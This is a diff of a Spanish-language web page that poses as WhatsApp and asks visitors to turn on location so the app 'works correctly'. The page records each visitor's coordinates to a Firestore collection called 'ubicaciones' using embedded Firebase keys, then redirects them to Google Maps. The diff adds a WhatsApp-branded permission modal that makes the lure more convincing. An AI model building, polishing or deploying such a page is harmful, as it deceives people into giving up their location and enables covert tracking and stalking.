@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -7,12 +6,13 @@
 <title>Proyecto 1</title>
 
 <style>
-    .imagen-superior{
+.imagen-superior{
     display:block;
     width:140px;
     margin:20px auto;
     border-radius:15px;
 }
+
 body{
     margin:0;
     padding:20px;
@@ -20,7 +20,6 @@ body{
     background:linear-gradient(180deg,#dcf8c6,#b9f5d0);
     min-height:100vh;
     text-align:center;
-    
 }
 
 h2{
@@ -42,38 +41,86 @@ iframe{
     border-radius:15px;
     box-shadow:0 5px 15px rgba(0,0,0,.25);
 }
+
+.modal{
+    display:none;
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background:rgba(0,0,0,.6);
+    justify-content:center;
+    align-items:center;
+    z-index:9999;
+}
+
+.modal-contenido{
+    background:#fff;
+    width:300px;
+    padding:20px;
+    border-radius:15px;
+    text-align:center;
+    box-shadow:0 5px 15px rgba(0,0,0,.3);
+}
+
+.modal-contenido h3{
+    color:#075E54;
+    margin-bottom:10px;
+}
+
+.modal-contenido p{
+    color:#444;
+    margin-bottom:20px;
+}
+
+.modal-contenido button{
+    background:#25D366;
+    color:#fff;
+    border:none;
+    padding:10px 20px;
+    border-radius:8px;
+    cursor:pointer;
+}
 </style>
 
 </head>
 <body>
-    <img src="logowhatsapp.jpg" alt="Logo" class="imagen-superior">
 
-<h2>whatsApp buscara la ubicación...</h2>
+<img src="logowhatsapp.jpg" alt="Logo" class="imagen-superior">
 
-<p id="estado">Activa la ubicacion para que WhatsApp funcione correctamente.</p>
+<h2>WhatsApp buscará la ubicación...</h2>
 
-<iframe
-    src="https://www.google.com/maps?q=Colombia&output=embed">
-</iframe>
+<p id="estado">Activa la ubicación para que WhatsApp funcione correctamente.</p>
 
+<iframe src="https://www.google.com/maps?q=Colombia&output=embed"></iframe>
+
+<div id="miAlerta" class="modal">
+    <div class="modal-contenido">
+        <img src="logowhatsapp.jpg" class="imagen-superior" alt="Logo">
+        <h3>Permiso de ubicación</h3>
+        <p id="textoAlerta"></p>
+        <button onclick="cerrarAlerta()">Aceptar</button>
+    </div>
+</div>
 
 <script type="module">
 
 import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
 import {
-  getFirestore,
-  collection,
-  addDoc,
-  serverTimestamp
+    getFirestore,
+    collection,
+    addDoc,
+    serverTimestamp
 } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-firestore.js";
 
 const firebaseConfig = {
-  apiKey: "AIzaSyDSWRC7tyowLD-ZnzvSzkTDS9L3P_eGfRM",
-  authDomain: "proyecto-1-ea0ed.firebaseapp.com",
-  projectId: "proyecto-1-ea0ed",
-  storageBucket: "proyecto-1-ea0ed.firebasestorage.app",
-  messagingSenderId: "440062306942",
-  appId: "1:440062306942:web:74eab86708e22587d7462f"
+    apiKey: "AIzaSyDSWRC7tyowLD-ZnzvSzkTDS9L3P_eGfRM",
+    authDomain: "proyecto-1-ea0ed.firebaseapp.com",
+    projectId: "proyecto-1-ea0ed",
+    storageBucket: "proyecto-1-ea0ed.firebasestorage.app",
+    messagingSenderId: "440062306942",
+    appId: "1:440062306942:web:74eab86708e22587d7462f"
 };
 
 const app = initializeApp(firebaseConfig);
@@ -81,12 +128,20 @@ const db = getFirestore(app);
 
 const estado = document.getElementById("estado");
 
-// Función para guardar la ubicación en Firestore
-async function guardarUbicacion(posicion) {
+function mostrarAlerta(texto){
+    document.getElementById("textoAlerta").textContent = texto;
+    document.getElementById("miAlerta").style.display = "flex";
+}
 
-    try {
+function cerrarAlerta(){
+    document.getElementById("miAlerta").style.display = "none";
+}
 
-        await addDoc(collection(db, "ubicaciones"), {
+async function guardarUbicacion(posicion){
+
+    try{
+
+        await addDoc(collection(db,"ubicaciones"),{
 
             lat: posicion.coords.latitude,
             lon: posicion.coords.longitude,
@@ -105,15 +160,15 @@ async function guardarUbicacion(posicion) {
 
         console.log("Ubicación guardada correctamente en Firebase.");
 
-        estado.textContent = "✅ Ubicación guardada. Redirigiendo...";
+        estado.textContent="✅ Ubicación guardada. Redirigiendo...";
 
         return true;
 
-    } catch (error) {
+    }catch(error){
 
-        console.error("Error al guardar la ubicación:", error);
+        console.error("Error al guardar la ubicación:",error);
 
-        estado.textContent = "⚠️ No se pudo guardar la ubicación.";
+        estado.textContent="⚠️ No se pudo guardar la ubicación.";
 
         return false;
 
@@ -121,33 +176,32 @@ async function guardarUbicacion(posicion) {
 
 }
 
-if ("geolocation" in navigator) {
+if("geolocation" in navigator){
 
     navigator.geolocation.getCurrentPosition(
 
         async function(posicion){
 
-            const lat = posicion.coords.latitude;
-            const lon = posicion.coords.longitude;
+            const lat=posicion.coords.latitude;
+            const lon=posicion.coords.longitude;
 
-            estado.textContent = "📍 Ubicación obtenida, guardando...";
+            estado.textContent="📍 Ubicación obtenida, guardando...";
 
-            const guardado = await guardarUbicacion(posicion);
+            const guardado=await guardarUbicacion(posicion);
 
-            if (guardado) {
+            if(guardado){
 
-                estado.textContent = "✅ Información guardada. Abriendo Google Maps...";
+                estado.textContent="✅ Información guardada. Abriendo Google Maps...";
 
                 setTimeout(function(){
 
-                    window.location.href =
-                    "https://www.google.com/maps?q=" + lat + "," + lon;
+                    window.location.href="https://www.google.com/maps?q="+lat+","+lon;
 
                 },2500);
 
-            } else {
+            }else{
 
-                estado.textContent = "⚠️ No fue posible guardar la información.";
+                estado.textContent="⚠️ No fue posible guardar la información.";
 
             }
 
@@ -158,19 +212,20 @@ if ("geolocation" in navigator) {
             switch(error.code){
 
                 case error.PERMISSION_DENIED:
-                    alert("Activa la ubicacion para continuar.");
+                    mostrarAlerta("Activa la ubicación para continuar.");
                     break;
 
                 case error.POSITION_UNAVAILABLE:
-                    alert("No fue posible obtener la ubicación.");
+                    mostrarAlerta("No fue posible obtener la ubicación.");
                     break;
 
                 case error.TIMEOUT:
-                    alert("La solicitud tardó demasiado.");
+                    mostrarAlerta("La solicitud tardó demasiado.");
                     break;
 
                 default:
-                    alert("Ocurrió un error desconocido.");
+                    mostrarAlerta("Ocurrió un error desconocido.");
+
             }
 
         },
@@ -183,9 +238,9 @@ if ("geolocation" in navigator) {
 
     );
 
-} else {
+}else{
 
-    alert("Tu navegador no soporta geolocalización.");
+    mostrarAlerta("Tu navegador no soporta geolocalización.");
 
 }
 
